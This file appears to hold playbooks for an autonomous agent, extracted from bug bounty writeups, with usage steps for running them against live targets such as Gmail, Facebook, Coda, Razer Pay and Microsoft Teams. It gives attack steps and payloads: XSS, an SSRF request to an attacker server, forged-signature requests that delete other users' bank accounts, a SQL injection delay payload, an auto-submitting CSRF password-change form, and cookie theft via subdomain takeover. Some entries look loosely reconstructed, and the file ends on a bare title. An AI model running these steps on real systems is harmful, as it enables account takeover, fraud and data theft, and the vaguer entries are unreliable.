description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Multiple XSS

trigger_conditions.when_to_apply: This technique is applicable when an input field on a Google Account sign-in or creation page allows for script injection, leading to stored XSS.
applicability_signals: Presence of input fields on Google Account sign-in/creation pages.
Lack of robust input sanitization on these fields.
skip_if: All input fields are properly sanitized and do not reflect or store any injected script.

recon_steps: Inspect all input fields on the Google Account sign-in and creation pages (e.g., email, password, name fields) for potential reflection or storage of user-supplied data.
Test for XSS by entering simple payloads like `<script>alert(1)</script>` into each input field and observe the response.
attack_steps: Step 1: Attempt to inject a JavaScript payload into an input field (e.g., email or name field) on the Google Account creation page.
Step 2: If the payload is reflected or stored, attempt to craft a more sophisticated XSS payload that can execute arbitrary JavaScript.
Step 3: If successful, an alert box should pop up, indicating successful XSS execution.
tools_recommended: Burp Suite or OWASP ZAP to intercept and modify requests.
success_indicators: An alert box displaying '1' appears on the page after submitting an input.
failure_indicators: The input is sanitized and no script execution occurs. Try different input fields or a different XSS vector.

playbooks.impact: An attacker could inject malicious scripts into Google Account pages, which could then be executed in the browser of any user who views the compromised page. This could lead to session hijacking, phishing, or defacement.
playbooks.key_lesson: Always test all input fields on authentication and account management pages for stored XSS vulnerabilities, as they are critical entry points for attackers.

meta.title: G Suite - Device Management XSS

trigger_conditions.when_to_apply: When an authenticated user can interact with the G Suite Device Management portal and input is reflected without proper sanitization.
prerequisites: Attacker has an authenticated Google account.
applicability_signals: Access to the G Suite Device Management portal is available.
Input fields within the Device Management portal reflect user-provided data in the response.
skip_if: Input is aggressively sanitized by a Web Application Firewall (WAF) or server-side validation.
No input fields are found that reflect data without sanitization.

recon_steps: Step 1: Access the G Suite Device Management portal while authenticated.
Step 2: Inspect various input fields and parameters within the portal for reflected user-supplied data.
attack_steps: Step 1: Identify an input field, such as a device name or description, within the Device Management portal.
Step 2: Inject a simple XSS payload like `<script>alert(document.domain)</script>` into the identified input field.
Step 3: Submit the form and observe the response or the rendered page for the execution of the JavaScript payload.
tools_recommended: Burp Suite (Proxy and Repeater to intercept and modify requests/responses)
success_indicators: An alert box pops up displaying the domain of the target website, indicating successful JavaScript execution.
failure_indicators: The injected script tags are stripped or encoded, and no alert box appears. Suggestion: Try different XSS payloads, look for other input vectors, or investigate DOM-based XSS.

playbooks.impact: An attacker can execute arbitrary JavaScript in the victim's browser, potentially leading to session hijacking, data theft, defacement, or further malicious actions within the context of the victim's authenticated session in the Device Management portal.
playbooks.key_lesson: Always test input fields for Cross-Site Scripting (XSS) vulnerabilities, especially in administrative or sensitive portals where authenticated users interact with various data entry points.

meta.title: DOM XSS in Gmail with a little help from Chrome

affected_components: Internal iframes communicating via postMessage API

trigger_conditions.when_to_apply: When Gmail uses the postMessage API for inter-frame communication and iframes are dynamically loaded with URLs provided in message data.
prerequisites: Attacker can trigger a postMessage event to an iframe within the victim's Gmail session.
The target browser (at the time of the writeup) did not enforce CSP for postMessage origins, or the CSP was weak.
The attacker can control the content of the originating frame that sends the postMessage.
applicability_signals: Observing postMessage events in DevTools with URLs in the message data.
Identifying iframes being loaded by JavaScript originating from `mail.google.com` or related Google domains.
The `appendChild` function being used to insert iframes where the `src` attribute is derived from message data.
skip_if: Content Security Policy (CSP) strictly enforces origin for postMessage and iframe sources.
All postMessage data is sanitized and does not contain executable code or exploitable URLs.
The channel name mechanism is robust and cannot be bypassed or predicted.

recon_steps: Step 1: Use a browser extension (e.g., postMessage logger) to view all `postMessage` events between iframes within a Gmail session. Look for messages containing URLs in their `data` property.

Step 2: Identify `postMessage` events originating from `hangouts.google.com` (or similar trusted Google domains) and targeting `mail.google.com` (or other Google domains). Pay attention to messages containing URLs with keywords like 'frame'.
Step 3: Use browser DevTools (Network tab) to filter for 'doc' type requests and observe the requests associated with the identified URLs. Check the referrer to confirm it's from `mail.google.com`.

Step 4: Use DevTools (Sources tab) to locate the JavaScript code initiating the iframe load (initiator of the request). Use the debugger to step through the code that handles the received `postMessage` and dynamically creates/loads iframes.
attack_steps: Step 1: Craft a malicious webpage hosted on an attacker-controlled domain.
Step 2: On the malicious webpage, use `window.open` to open a new tab to `mail.google.com` for the victim.

Step 3: Once `mail.google.com` is loaded, use `window.opener.postMessage` from the malicious tab to send a crafted message to the Gmail tab. The message data should contain a `javascript:` URI (e.g., `javascript:alert(1)`) or a URL that can be exploited.
Step 4: Observe if the `javascript:` URI is executed due to improper sanitization or CSP bypass on the target Gmail iframe.
tools_recommended: Browser Developer Tools (Console, Network, Sources, Debugger)
postMessage logger browser extension
success_indicators: An `alert(1)` box appears on the victim's Gmail page.
Browser DevTools console shows CSP errors related to origin enforcement if it was supposed to block the action.
The executed JavaScript code performs unintended actions such as reading/sending emails.
failure_indicators: CSP errors preventing the execution of the `javascript:` URI.
The target frame does not process messages with attacker-controlled data.
The random channel name mechanism successfully filters out the attacker's message (if applicable and not bypassed).

playbooks.impact: Arbitrary code execution within the victim's Gmail context, allowing an attacker to read emails, send emails on behalf of the victim, change account settings, or perform other actions as if they were the logged-in user.
playbooks.key_lesson: Always validate the origin and content of messages received via `postMessage` and ensure strict Content Security Policy (CSP) is enforced, especially when cross-origin communication is involved.

meta.title: Blind SSRF on coda.io

trigger_conditions.when_to_apply: When a user pastes a link into a Coda document, triggering an API request to resolve the embed.
prerequisites: User is authenticated to Coda.io
Burp Suite or similar intercepting proxy is in use
applicability_signals: Pasting a link into a Coda document triggers a request to `/api/oembedResolve`
The `/api/oembedResolve` endpoint has a `url` parameter that is user-controllable
skip_if: Requests to `/api/oembedResolve` are not captured by the proxy
The `url` parameter is not present or is not user-controllable

recon_steps: Step 1: Create a new Coda document.
Step 2: Set up an intercepting proxy (e.g., Burp Suite).
attack_steps: Step 1: Paste a valid URL (e.g., `http://google.com`) into the Coda document.
Step 2: Intercept the HTTP request made by Coda.io in the proxy.
Step 3: Identify the `/api/oembedResolve` endpoint and the `url` parameter.
Step 4: Replace the value of the `url` parameter with an internal IP address or a domain pointing to a server controlled by the attacker (e.g., `http://<ATTACKER_CONTROLLED_SERVER_IP>`).
Step 5: Forward the modified request.

Step 6: Monitor the attacker-controlled server for incoming HTTP requests to confirm SSRF. Note: The writeup states this is 'Blind SSRF', implying direct response leakage might not occur. Success relies on external interaction.
payloads_or_patterns:
GET /api/oembedResolve?docId=<DOC_ID>&url=http://<INTERNAL_IP_OR_ATTACKER_HOST>&isMobile=false&type=embed HTTP/1.1
Host: coda.io
User-Agent: Mozilla/5.0 ...
Cookie: <SESSION_COOKIE_HERE>
tools_recommended: Burp Suite (Proxy, Repeater)
Ngrok (for exposing local IP to the internet if testing with an internal IP)
success_indicators: An HTTP request is received on the attacker-controlled server from coda.io's IP address.
If the SSRF is not blind, the response from coda.io will contain data from the requested internal resource or an error indicating access.
failure_indicators: No request is received on the attacker-controlled server.
A `403 Forbidden` or `400 Bad Request` response is received from the target.
The `url` parameter is sanitized or rejected before reaching the backend.

playbooks.impact: Allows an attacker to make arbitrary requests from Coda's internal network to internal or external resources. This can lead to information disclosure of internal services, or further exploitation if Coda's internal services are vulnerable.
playbooks.key_lesson: When handling URLs in user-generated content that trigger backend requests, always validate and sanitize the URL to prevent SSRF vulnerabilities by ensuring it points to an expected external resource and not an internal IP or sensitive service.

meta.title: Exposure of Facebook object type by knowing the object ID

affected_components: API endpoints that return object types based on object IDs

trigger_conditions.when_to_apply: When an attacker has the ability to make authenticated API requests and suspects that object IDs might reveal information about object types, including private ones.
prerequisites: An active authenticated session with Facebook.
applicability_signals: API endpoints that accept object IDs as parameters.
Responses that include object type information or metadata.
skip_if: All API requests are blocked or require specific permissions not obtainable by an authenticated user.
Object IDs consistently return generic or anonymized responses without revealing specific types.

recon_steps: Step 1: Authenticate to Facebook and observe network traffic to identify API endpoints that handle object IDs.
Step 2: Analyze responses for patterns related to object types and associated metadata.
attack_steps: Step 1: Construct requests to various Facebook API endpoints known or suspected to return object information.
Step 2: Iterate through a range of plausible object IDs.
Step 3: Observe the response for each object ID, paying close attention to any fields that indicate the type of the object (e.g., 'type', 'object_type', 'kind').
Step 4: Identify if private or sensitive object types can be determined without explicit permission.
payloads_or_patterns: Enumerate plausible object IDs (e.g., numeric sequences, known patterns for posts, users, groups, events).
Example request structure (hypothetical): GET /api/vX/objects?id=<OBJECT_ID> with authentication headers/cookies.
tools_recommended: Burp Suite: To intercept and modify requests, observe responses, and automate ID enumeration.
Custom script (Python/Bash): To systematically test a large range of object IDs against identified endpoints.
success_indicators: Responses that explicitly reveal the type of an object, especially if it's an object that should be private or inaccessible.
Consistent detection of object types across a range of tested IDs.
failure_indicators: All tested object IDs return generic error messages or non-specific data.
API responses consistently return '403 Forbidden' or similar access denied errors for non-public objects.
Responses return 'object not found' for all tested IDs.

playbooks.impact: Disclosure of Facebook object types, potentially including private or sensitive objects like unreleased features, internal tools, or user-specific private content metadata, even if the content itself is not directly accessible.
playbooks.key_lesson: When interacting with APIs that handle object IDs, systematically enumerate possible IDs and analyze responses for any disclosed object type information, paying special attention to potential privacy implications.

meta.title: Add draft subtitles to any Facebook video and Full Path Disclosure

trigger_conditions.when_to_apply: When an authenticated user can upload or manage videos on Facebook, specifically when there's an interface or API that handles video processing or subtitle generation.
prerequisites: Authenticated user session with the ability to interact with video features.
applicability_signals: Observed HTTP requests related to video uploads or management.
Responses containing file paths or server-side information.
skip_if: No video upload or management features are accessible.
All responses are sanitized and do not reveal server-side paths or file structures.

recon_steps: Step 1: Navigate to the Facebook video upload or management interface.
Step 2: Perform actions such as uploading a video, adding subtitles, or editing video properties.
Step 3: Intercept and analyze all HTTP requests and responses using a proxy (e.g., Burp Suite, OWASP ZAP).
attack_steps: Step 1: Upload a video file to Facebook.
Step 2: Attempt to add draft subtitles to the uploaded video, or interact with any feature that triggers background processing of the video.
Step 3: Observe the responses from the server during and after these actions. Look for error messages, debugging information, or redirects that might contain full server-side file paths.
Step 4: If a full path is disclosed, confirm it by attempting to access relative paths within the disclosed directory structure.
payloads_or_patterns: N/A (This is an information disclosure vulnerability, not typically exploited with specific payloads beyond user interaction.)
tools_recommended: Burp Suite: For intercepting and analyzing HTTP requests and responses.
OWASP ZAP: Alternative proxy for traffic analysis.
success_indicators: HTTP responses containing absolute server-side file paths (e.g., /var/www/html/facebook/videos/..., C:\inetpub\wwwroot\facebook\...)
Error messages that reveal internal file structures or script locations.
failure_indicators: Responses that do not contain any discernible file paths or server-side information.
Generic error messages without technical details.

playbooks.impact: Disclosure of full server-side file paths can provide attackers with valuable information about the web server's file structure, which can be used in conjunction with other vulnerabilities (e.g., LFI, misconfigurations) to further compromise the system.
playbooks.key_lesson: Always inspect HTTP responses for full path disclosure during file upload or processing operations, as error messages or redirects can inadvertently reveal sensitive server-side information.

meta.title: Ok Google! bypass ‘flag_secure’

tech_stack_fingerprints: Android OS with specific versions (Android 9 tested)

trigger_conditions.when_to_apply: When the target device has Google Assistant installed and configured, and the user has enabled the 'Use Screen Context' option within Google Assistant settings.
prerequisites: Target device must be running Android 9 or a compatible version.
Google Search app must be installed and Google Assistant enabled.
The 'Use Screen Context' option within Google Assistant settings must be enabled.
The 'General' settings for Google Search must have screenshots enabled.
applicability_signals: Ability to enable 'Use Screen Context' in Google Assistant settings.
Ability to enable screenshots in Google Search 'General' settings.
skip_if: The 'Use Screen Context' option is not available or cannot be enabled.
The Google Search app does not have screenshot functionality enabled in its general settings.
Screenshots are consistently blocked by FLAG_SECURE even when using Google Assistant commands.

recon_steps: Step 1: Install the Google Search app and enable Google Assistant on an Android 9 device.
Step 2: Navigate to Google Search settings -> 'General' and enable the 'screenshots' option.
Step 3: Navigate to Google Assistant settings -> 'Phone' -> 'Google Assistant' and enable the 'Use Screen Context' option.
attack_steps: Step 1: On the target device, open Chrome in incognito mode.
Step 2: Attempt to take a screenshot using the physical buttons (e.g., Power + Volume Down) to confirm FLAG_SECURE is active and blocking standard screenshots.
Step 3: Activate Google Assistant by holding the home button and say 'take screenshot' or 'share screenshot'.
Step 4: Observe if Google Assistant successfully captures the screen content despite FLAG_SECURE being active.
tools_recommended: Android device (Pixel 2, Pixel 3 with Android 9 tested)
Google Search app
Google Assistant
success_indicators: Google Assistant captures a screenshot of the protected screen, bypassing FLAG_SECURE restrictions.
The captured screenshot is visible and can be shared or saved.
failure_indicators: Google Assistant fails to take a screenshot and reports an error or indicates that screenshots are not allowed. In this case, the technique is not applicable or the target environment has been patched.
Standard screenshot methods still fail, but Google Assistant also fails to capture the screen.

playbooks.impact: An attacker could potentially capture sensitive information displayed on the screen, even if the application has attempted to protect it using FLAG_SECURE. This could lead to the exposure of confidential data, credentials, or private information.
playbooks.key_lesson: Always test if voice assistants or other system-level functionalities can bypass application-level security flags like FLAG_SECURE, especially when interacting with screen content.

meta.title: Hacking Razer Pay Ewallet App

trigger_conditions.when_to_apply: When an authenticated user can make requests to an API endpoint that uses a signature to protect against parameter tampering, and the signature calculation logic can be understood or bypassed.
prerequisites: Attacker has an authenticated session with the Razer Pay app.
Attacker can intercept and analyze network traffic.
Attacker can reverse-engineer the Android application (APK).
applicability_signals: API requests contain a 'signature' field.
Attempting to tamper with request parameters results in an error.
Evidence of signature calculation logic within the app's code (e.g., methods like 'MD5Encode').
skip_if: All API requests are stateless and do not contain any form of dynamic signature or anti-tampering mechanism.
Signature calculation is too complex or relies on server-side secrets that cannot be extracted or replicated.

recon_steps: Step 1: Intercept and analyze all network traffic from the Razer Pay app using a proxy like Burp Suite.
Step 2: Identify API endpoints that perform sensitive actions (e.g., deleting bank accounts, accessing user data, sending messages).
Step 3: Observe the structure of requests, specifically looking for a 'signature' parameter and any other parameters that might influence its calculation.
Step 4: Attempt to modify parameters on captured requests and observe the server's response to confirm that the signature field is indeed a protection mechanism.
Step 5: Decompile the Razer Pay Android APK using apktool and analyze the code with Jadx-GUI to locate the signature calculation logic (e.g., search for 'signature', 'MD5', 'hash', 'encode').
attack_steps: Step 1: For a target endpoint like /deleteBankAccount, identify a parameter that represents a unique identifier (e.g., bank ID).
Step 2: Using the de-obfuscated code or Frida, identify the exact method and parameters used for signature calculation.
Step 3: Capture a legitimate request made by the attacker's account for a specific bank account.
Step 4: Extract the parameter values from the captured request and the target bank account ID from another user's account.
Step 5: Use Frida to hook the signature calculation method and provide it with the modified parameter values (including the target bank account ID) to generate a new, valid signature.
Step 6: Reconstruct the original request, replacing the original bank account ID with the target user's bank account ID and including the newly generated signature.
Step 7: Send the modified request to the server.
Step 8: Repeat steps 1-7 for other API endpoints identified during recon (e.g., chat message access, profile information retrieval) by substituting appropriate parameter names and values.
payloads_or_patterns:
POST /deleteBankAccount HTTP/1.1
Host: api.razerpay.com
Content-Type: application/json
... (other headers) ...

{"bankId": "<TARGET_BANK_ID>", "signature": "<CALCULATED_SIGNATURE>"}

POST /sendMessage HTTP/1.1
Host: api.razerpay.com
Content-Type: application/json
... (other headers) ...

{"userId": "<TARGET_USER_ID>", "message": "<ATTACKER_MESSAGE>", "signature": "<CALCULATED_SIGNATURE>"}
tools_recommended: Burp Suite: For intercepting and analyzing HTTP traffic.
apktool: For decompiling Android APK files.
Jadx-GUI: For static analysis of decompiled Java code.
Frida: For runtime manipulation of the Android app and automating signature recalculation.
success_indicators: The target bank account is successfully deleted from the Razer Pay app (as observed by the attacker or a confederate).
The attacker can view or interact with another user's chat messages or private information.
The attacker can perform actions on behalf of another user, such as sending messages or accessing account details.
failure_indicators: The server responds with an error indicating an invalid signature (e.g., 400 Bad Request, custom error message). This suggests the signature calculation logic was not accurately replicated or the parameter order/values are incorrect. -> Refine signature calculation or try different parameter combinations.
The server responds with a generic error or a 404 Not Found for modified requests. -> Verify endpoint existence and expected parameters.
No observable change in the target user's account or data. -> Confirm successful request delivery and check for alternative IDOR vectors.

playbooks.impact: An attacker can gain unauthorized access to other users' financial information (bank accounts), private communications (chat messages), and potentially perform actions on their behalf, leading to financial loss, privacy breaches, and account compromise.
playbooks.key_lesson: When APIs use custom signature mechanisms for request integrity, reverse engineer the signature generation logic and use dynamic instrumentation tools like Frida to automate the recalculation of signatures for modified payloads to uncover IDOR vulnerabilities.

meta.title: Researching Polymorphic Images for XSS on Google Scholar

tech_stack_fingerprints: Uses XHR to fetch templating snippets
Renders content unescaped using location.hash parameters

trigger_conditions.when_to_apply: When a web application allows authenticated users to upload images and renders content fetched via XHR using location.hash parameters without proper escaping, especially if image transformations are applied server-side.
prerequisites: Authenticated user account on Google Scholar
Ability to upload images
applicability_signals: The application fetches and renders content using location.hash parameters and XHR.
The application allows users to upload arbitrary content, specifically images.
Server-side image processing (transformations, metadata stripping) is in place.
skip_if: Images are strictly validated and do not allow arbitrary data embedding.
All uploaded images are stripped of all metadata and content.
The application performs strict Content Security Policy (CSP) checks that prevent inline script execution from uploaded content.

recon_steps: Step 1: Analyze network traffic when navigating Google Scholar to identify XHR requests fetching templating snippets and how location.hash parameters are used.
Step 2: Inspect the image upload functionality for any restrictions or file type limitations.
Step 3: Upload various image types (JPG, PNG) and observe server-side transformations by comparing original and processed images (e.g., metadata, file size, quality).
attack_steps: Step 1: Craft a JPG image with an embedded XSS payload within the Entropy-Coded Segment (ECS) or EXIF metadata.
Step 2: Attempt to upload the crafted image to Google Scholar.

Step 3: If the direct upload doesn't trigger XSS, iterate on payload embedding techniques within the image data, particularly focusing on byte sequences that might survive server-side transformations (e.g., specific byte patterns like 0x00 and 0x14 found to be effective).
Step 4: Observe if the server-side image processing preserves any part of the embedded payload that can be interpreted as executable JavaScript in the context of the rendered page.
Step 5: If the payload is successfully rendered as executable JavaScript, verify XSS by observing a change in page behavior (e.g., alert box, cookie exfiltration).
payloads_or_patterns: Custom crafted image bytes with embedded JavaScript, potentially including patterns like 0x00 and 0x14 preceding the payload within the ECS segment of a JPG.
tools_recommended: Exiftool: For manipulating image metadata.
ImageMagick/GraphicsMagick/Libvips: To analyze image processing behavior.
Hex editor: For manual byte manipulation of image files.
Burp Suite: To intercept and analyze HTTP requests/responses, and for payload testing.
success_indicators: An alert box appears with a custom message (e.g., 'XSS').
The uploaded image, when rendered, executes JavaScript originating from the embedded payload.
Observable client-side JavaScript execution that could lead to session hijacking or data theft.
failure_indicators: Image upload fails due to validation.
Server-side processing completely strips the embedded payload, rendering it non-executable.
Response contains no evidence of script execution, indicating the payload was not preserved or interpreted.
CSP violations preventing script execution.

playbooks.impact: Stored XSS vulnerability allows an attacker to execute arbitrary JavaScript in the context of other users' browsers when they view the compromised image on Google Scholar. This can lead to session hijacking, defacement, phishing, or redirection to malicious sites.
playbooks.key_lesson: When dealing with user-uploaded content that is processed server-side, research and test polymorphic image techniques to embed payloads that can survive image transformations and bypass filters. Pay close attention to specific byte patterns that might be preserved by image processing libraries.

meta.title: Exploiting SQL Injection Vulnerability

trigger_conditions.when_to_apply: When a web application endpoint requires a signature for requests and the signature generation logic can be determined, particularly if the secret key is leaked or can be brute-forced.
prerequisites: The application uses a signature mechanism to validate requests.
The signature generation algorithm (e.g., MD5) and the SecretKey are known or discoverable.
applicability_signals: Endpoint URL pattern like /vuln.php?param=<value>&sig=<signature>
Responses indicate SQL errors when parameters are manipulated.
Documentation or leaked source code reveals signature generation process and SecretKey.
skip_if: The signature generation logic is highly complex and the SecretKey cannot be determined.
The application performs server-side validation of the signature that cannot be bypassed.
All attempts to inject SQL syntax result in invalid signature errors without any specific SQL error.

recon_steps: Step 1: Analyze documentation or network traffic to understand the signature generation process for requests to http://site.com/vuln.php.
Step 2: Identify the parameters involved in signature calculation and the SecretKey used in MD5 hashing.
Step 3: Confirm the signature format: md5(params_value + SecretKey).
attack_steps: Step 1: Construct a request with a manipulated 'param' value, e.g., http://site.com/vuln.php?param=1".
Step 2: Calculate the corresponding MD5 signature for the manipulated request using the identified SecretKey and the formula: md5(1" + SecretKey).
Step 3: Send the crafted request with the calculated signature: https://site.com/vuln.php?param=1"&sig=<calculated_signature>.
Step 4: Observe the response for SQL errors indicating successful injection.
Step 5: To achieve a delay, construct a query using the SLEEP() function. Example: 1" UNION SELECT 1,SLEEP(10),3 -- +-
Step 6: Calculate the signature for the new payload: md5('1" UNION SELECT 1,SLEEP(10),3 -- +-' + SecretKey).
Step 7: Send the request with the delay payload and its signature: http://site.com/vuln.php?param=1+UNION+SELECT+1%2CSLEEP%2810%29%2C3--%2B-&sig=<calculated_signature_for_delay>.
payloads_or_patterns: SQLi payload for delay: <original_param_value>" UNION SELECT 1,SLEEP(10),<num_columns> -- +-
tools_recommended: Custom PHP script for rapid signature generation and request sending.
Burp Suite for intercepting and modifying requests.
SQLMap with a custom tamper script to handle the signature requirement.
success_indicators: Receiving a 'MySQL Error' in the response indicating successful SQL syntax injection.
A 10-second delay in the server response when using the SLEEP(10) payload.
failure_indicators: Receiving a '200 OK' response with no error, indicating the signature might be invalid or the injection was not successful.
Receiving a generic error message or a redirect, suggesting input sanitization or a different WAF rule is active.
If SQL errors are not observed, consider other injection points or character set issues. Try different SQL syntax or encoding.

playbooks.impact: The attacker can execute arbitrary SQL queries on the database, potentially leading to data exfiltration (e.g., user credentials, sensitive information), data modification, data deletion, or even remote code execution if database configurations allow.
playbooks.key_lesson: When encountering request signature mechanisms, prioritize discovering the signature generation logic and the SecretKey. If successful, this bypass can enable standard injection testing like SQLi.

meta.title: Account taken over in style !!!

trigger_conditions.when_to_apply: When a web application implements a 'set new password' feature for newly created accounts that bypasses the need for the old password, and this feature is vulnerable to CSRF.
prerequisites: Attacker has an authenticated session in the target application.
Target application has a password change mechanism that does not require the old password under certain conditions (e.g., initial setup).
applicability_signals: Observe a 'set new password' popup or prompt on initial login for new accounts.
Identify that the password change functionality does not require the 'old password' when a new password is being set for the first time after account creation.
Intercept a 'set new password' request and confirm the absence of CSRF tokens or other CSRF prevention mechanisms.
skip_if: All password change requests are protected by CSRF tokens.
The 'set new password' feature requires the old password for all users, regardless of account age or creation date.

recon_steps: Step 1: Create a new account on the target application and log in.
Step 2: Navigate to the account settings or profile page to observe any password change prompts or behaviors.

Step 3: If a 'set new password' prompt appears, log in with a separate, pre-existing account (if available) and navigate to its settings page to compare the behavior. Alternatively, create a second account and observe if the 'set new password' prompt is also presented.
Step 4: Use Burp Suite or a similar proxy to intercept the HTTP request for the 'set new password' functionality. Analyze the request for parameters and the presence of CSRF tokens.
attack_steps: Step 1: Identify the endpoint and parameters used for the 'set new password' functionality from the intercepted request.
Step 2: Craft a malicious HTML page containing a form that automatically submits to the 'set new password' endpoint with a desired new password.
Step 3: Include the attacker's session cookie or exploit CSRF mechanisms to make the request originate from a victim's authenticated session.
Step 4: Host the malicious HTML page on a publicly accessible server or send it as a link to the victim.
Step 5: Instruct the victim to visit the malicious link while logged into their account.
payloads_or_patterns:
<form action="<TARGET_URL>/change_password" method="POST" id="csrf-form">
  <input type="hidden" name="new_password" value="<ATTACKER_CONTROLLED_PASSWORD>">
  <input type="hidden" name="confirm_password" value="<ATTACKER_CONTROLLED_PASSWORD>">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
tools_recommended: Burp Suite: For intercepting and analyzing HTTP requests, and for crafting CSRF POCs.
A web server (e.g., Python's http.server, ngrok): To host the CSRF exploit page.
success_indicators: The victim's password is changed to the attacker-controlled password.
The attacker can log in to the victim's account using the new password.
The victim receives a notification of a password change (if applicable) and is logged out.
Subsequent login attempts with the old credentials fail.
failure_indicators: The target page returns a 403 Forbidden status code or a 'CSRF token mismatch' error, indicating CSRF protection is in place.
The password change request fails with an error message not related to CSRF, but indicates insufficient permissions or invalid input.
The 'set new password' popup is still displayed for the victim, indicating the CSRF exploit did not execute successfully.

playbooks.impact: Account takeover, allowing the attacker to access sensitive user data, perform actions on behalf of the user, or potentially escalate privileges if the compromised account has administrative rights.
playbooks.key_lesson: Always implement robust CSRF protection on all state-changing requests, especially password management, and verify that initial account setup flows do not create unauthenticated or easily exploitable password reset/change mechanisms.

meta.title: Piercing the Veal: Short Stories to Read with Friends

affected_components: Features that accept URLs as parameters

trigger_conditions.when_to_apply: When a web application feature accepts a URL or domain as a parameter, and this parameter is used to make a server-side request.
prerequisites: The target application must have features that process external URLs submitted by users.
applicability_signals: Endpoints that accept POST requests with parameters named 'url' or similar, containing a URL.
Features like webhooks, HTML to PDF generators, or any service that fetches external resources based on user input.
skip_if: If all outgoing requests are strictly validated against a whitelist and no bypass is possible.
If the application explicitly sanitizes and rejects any URL that is not on an approved list.

recon_steps: Step 1: Inspect HTTP requests for parameters containing URLs, especially in POST bodies.
Step 2: Identify features that fetch external content (e.g., images, PDFs, webhooks) and analyze their network requests.
attack_steps: Step 1: Send a POST request to a vulnerable endpoint (e.g., `/fetchPage`) with a parameter 'url' set to a controlled external URL (e.g., http://<your-collaborator-domain>/test).
Step 2: Observe the server's response or any network callbacks to your collaborator instance.
Step 3: If direct SSRF is not immediately obvious, attempt to access internal network resources by crafting URLs that point to private IP addresses (e.g., http://127.0.0.1:8080, http://192.168.1.1).
payloads_or_patterns:
POST /fetchPage HTTP/1.1
Host: app.example.com
...
Content-Type: application/x-www-form-urlencoded
url=http://<TARGET_URL>/test
tools_recommended: Burp Suite: Use the Repeater or Intruder to modify URL parameters and scan for callbacks.
OAST tools (e.g., Burp Collaborator, interact.sh): To detect blind SSRF vulnerabilities.
success_indicators: A callback is received at the OAST tool from the target server.
The target server's response contains content from an internal resource.
The target server returns an error indicating it attempted to connect to an internal IP or service.
failure_indicators: No callbacks received, and no internal content is leaked in responses → The URL parameter is likely strictly validated or the feature does not perform sensitive SSRF-able actions. Pivot to testing other parameters or features.
A 403 Forbidden error on requests to internal IPs → The WAF is blocking access to internal resources. Attempt to use different protocols (e.g., `file://`) or bypass techniques if possible.

playbooks.impact: Allows an attacker to make arbitrary requests from the server's network position, potentially accessing internal services, sensitive data, cloud metadata endpoints, or performing port scanning.
playbooks.key_lesson: Always test parameters that contain URLs for SSRF vulnerabilities, as they can lead to significant impact by allowing requests to internal network resources.

meta.title: Beware of the GIF: Account Takeover Vulnerability in Microsoft Teams

affected_components: Developer Events Marketplace (potentially subdomains used for integrations or events)

trigger_conditions.when_to_apply: When a Microsoft Teams integration or developer event subdomain is identified and found to be vulnerable to subdomain takeover.
prerequisites: Attacker can identify an unassigned or misconfigured subdomain associated with Microsoft Teams developer events or integrations.
applicability_signals: A subdomain associated with Microsoft Teams (e.g., 'developer.teams.microsoft.com' or similar pattern) that points to a service that can be taken over (e.g., S3 bucket, Azure Blob Storage, custom CNAME records pointing to non-existent services).
skip_if: All identified Microsoft Teams related subdomains are properly configured and pointed to active, legitimate services.

recon_steps: Step 1: Identify subdomains associated with Microsoft Teams developer events and integrations. Look for patterns like 'events.teams.microsoft.com', 'dev.teams.microsoft.com', 'marketplace.teams.microsoft.com'.
Step 2: Use subdomain enumeration tools (e.g., Subfinder, Amass) and DNS reconnaissance to find potentially orphaned or misconfigured subdomains.

Step 3: For each identified subdomain, check its DNS records (CNAME, MX, A records) to see if they point to services that could be vulnerable to takeover (e.g., AWS S3 buckets, Azure Blob Storage, Heroku apps, Shopify stores, etc.). Tools like 'Subjack' or manual checks can identify these.
Step 4: Attempt to register the orphaned subdomain's target service (e.g., create an S3 bucket with the same name if the CNAME points to an S3 bucket and it's not owned).
attack_steps: Step 1: Upon confirming a subdomain takeover vulnerability (e.g., successfully registering an S3 bucket with the same name as the CNAME target), configure the takeover service (e.g., the S3 bucket) to host malicious content.
Step 2: Host a specifically crafted GIF file within the takeover service. This GIF would contain embedded malicious scripts or exploit data.

Step 3: Craft an email or message to target users within the compromised organization, encouraging them to view the 'GIF' or interact with a link that points to the malicious GIF hosted on the compromised subdomain.
Step 4: When a user views the GIF, the embedded script would execute in their browser context, potentially scraping user data (like session cookies or PII) accessible from that origin.
Step 5: Transmit the scraped data to an attacker-controlled server.
Step 6: Use the stolen session cookies or user credentials to gain unauthorized access to the user's Microsoft Teams account.
Step 7: Leverage the compromised user's access to potentially gain further access to organizational data or perform actions on behalf of the user.
payloads_or_patterns: A GIF file crafted to contain JavaScript payloads. The exact payload would depend on the specific exploit technique, but could involve XSS payloads that execute when the GIF is loaded or rendered in a browser.
tools_recommended: Subfinder/Amass: For subdomain enumeration.
Subjack: For identifying subdomain takeover vulnerabilities.
Burp Suite: For intercepting and analyzing HTTP requests and responses.
AWS CLI / Azure CLI: For interacting with cloud storage services if takeover is confirmed.
A tool to craft GIF files with embedded payloads (custom script or specialized malware development tools).
success_indicators: Confirmation that the attacker-controlled subdomain is resolving to the attacker's hosted malicious content.
User interaction with the malicious GIF leading to the execution of embedded scripts.
Reception of scraped user data (cookies, PII) at the attacker-controlled server.
Successful authentication to a Microsoft Teams account using stolen credentials or session tokens.
failure_indicators: Subdomain enumeration reveals no exploitable subdomains.
Attempting to register the target service for takeover fails because it's already owned.
Users viewing the GIF do not trigger any malicious scripts (e.g., due to browser security features or incorrect payload implementation).
Scraped data is incomplete or empty.
Attempts to log in with stolen credentials fail.

playbooks.impact: Complete takeover of individual Microsoft Teams accounts, potentially leading to unauthorized access to sensitive organizational data, corporate communications, and further lateral movement within the organization's network. Could lead to a significant breach of confidentiality and integrity.
playbooks.key_lesson: Vigilantly identify and test subdomains associated with critical SaaS applications for subdomain takeover vulnerabilities, as these can serve as an entry point for account compromise.

meta.title: 1-click RCE on Keybase

